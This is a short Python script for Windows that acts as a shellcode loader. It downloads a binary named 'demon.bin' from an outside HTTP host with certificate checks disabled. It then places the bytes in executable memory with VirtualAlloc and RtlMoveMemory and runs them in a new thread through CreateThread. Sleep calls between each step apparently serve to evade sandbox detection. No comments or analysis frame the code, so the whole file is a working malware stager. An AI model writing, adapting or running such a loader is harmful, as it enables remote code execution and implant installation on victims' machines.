import ctypes
import requests
from time import sleep
url = 'http://zhienisgay.com:8080/demon.bin'
r = requests.get(url, stream=True, verify=False)
scbytes = r.content

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.CreateThread.argtypes = (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
sleep(60)
print(1)
mem = ctypes.windll.kernel32.VirtualAlloc(
	ctypes.c_int(0),
	ctypes.c_int(len(scbytes)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40)
	)
sleep(60)
print(2)
buf = (ctypes.c_char * len(scbytes)).from_buffer_copy(scbytes)
sleep(60)
print(3)
ctypes.windll.kernel32.RtlMoveMemory(
	ctypes.c_void_p(mem),
	buf,
	ctypes.c_int(len(scbytes))
	)
sleep(60)
print(4)
handle = ctypes.windll.kernel32.CreateThread(
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.c_void_p(mem),
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.pointer(ctypes.c_int(0))
	)
print("Done")